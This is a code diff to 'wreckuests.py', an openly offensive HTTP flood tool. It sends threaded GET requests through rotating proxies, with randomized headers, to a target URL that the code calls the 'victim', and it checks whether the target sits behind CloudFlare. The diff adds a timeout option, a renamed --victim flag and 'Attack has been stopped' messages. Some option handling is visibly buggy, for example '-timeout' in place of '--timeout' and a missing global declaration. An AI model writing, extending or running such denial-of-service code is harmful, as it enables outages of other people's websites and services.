@@ -1,12 +1,12 @@
 # -*- coding: utf-8 -*-
-import sys, os, threading, random, requests, time, getopt, asyncio, socket, re
+import sys, os, threading, random, requests, time, getopt, socket
 from threading import Thread, Event
 from netaddr import IPNetwork, IPAddress
 from requests.auth import HTTPBasicAuth
 from urllib.parse import urlparse
 
 #versioning
-VERSION = (0, 1, 0)
+VERSION = (0, 1, 2)
 __version__ = '%d.%d.%d' % VERSION[0:3]
 
 #if python ver < 3.5
@@ -26,6 +26,7 @@ ips = []
 ref = []
 keyword = []
 ua = []
+timeout = 10
 
 # arguments
 url = ''
@@ -37,7 +38,7 @@ auth_pass = ''
 # main
 def main(argv):
 	try:
-		opts, args = getopt.getopt(argv, 'ht:a:', ['help', 'target=', 'auth='])
+		opts, args = getopt.getopt(argv, 'hv:a:t:', ['help', 'victim=', 'auth=', 'timeout='])
 	except getopt.GetoptError as err:
 		print(err)
 		showUsage()
@@ -46,9 +47,13 @@ def main(argv):
 		if opt in ('-h', '--help'):
 			showUsage()
 			sys.exit(2)
-		elif opt in ('-t', '--target'):
-			global url
-			url = arg
+		elif opt in ('-v', '--victim'):
+			if len(arg) >= 1:
+				global url
+				url = arg
+			else:
+				print('Parameter [--victim] must be a string and not to be empty!')
+				sys.exit(2)
 		elif opt in ('-a', '--auth'):
 			global auth
 			global auth_login
@@ -56,6 +61,13 @@ def main(argv):
 			auth = True
 			auth_login = arg.split(':')[0]
 			auth_pass = arg.split(':')[1]
+		elif opt in ('-t', '-timeout'):
+			arg = int(arg)
+			if isinstance(arg, int) and arg >= 1:
+				timeout = arg
+			else:
+				print('Parameter [--timeout] must be an integer and not to be less than 1')
+				sys.exit(2)
 	parseFiles()
 
 def parseFiles():
@@ -125,19 +137,20 @@ def request(index):
 		proxy = {'http': ips[index]}
 		try:
 			if auth:
-				r = requests.get(url, params=payload, headers=headers, proxies=proxy, auth=HTTPBasicAuth(auth_login, auth_pass))
+				r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
 			else:
-				r = requests.get(url, params=payload, headers=headers, proxies=proxy)
+				r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout)
 			if r.status_code == 406 and only_gzip < 5:
 				only_gzip += 1
 		except requests.exceptions.ChunkedEncodingError:
 			err_count += 1
-		except requests.exceptions.ConnectionError as err:
+		except requests.exceptions.ConnectionError:
 			err_count += 1
+		except requests.exceptions.ReadTimeout:
+			pass
 		if err_count >= 20:
 			print("Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
 			return
-	print('Stop thread [' + str(index) + ']')
 
 #CloudFlare Check and noticing
 def cloudFlareCheck():
@@ -168,9 +181,9 @@ def startAttack():
 			time.sleep(.05)
 	except KeyboardInterrupt:
 		ex.set()
+		print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
 		for t in threads:
 			t.join()
-		print('\rScript has been stopped')
 
 def isCloudFlare(link):
 	#get origin IP by domain
@@ -194,7 +207,7 @@ def addressInNetwork(ip, net):
         return True
 
 def showUsage():
-	print("Usage: wreckuests.py -t <'url'> -a <'login:pass'>\nPlease, read more about arguments in GitHub repository!")
+	print("Usage: wreckuests.py -t <url> [-a] <login:pass> [-t] <timeout>\nPlease, read more about arguments in GitHub repository!")
 
 if __name__ == '__main__':
 	main(sys.argv[1:])
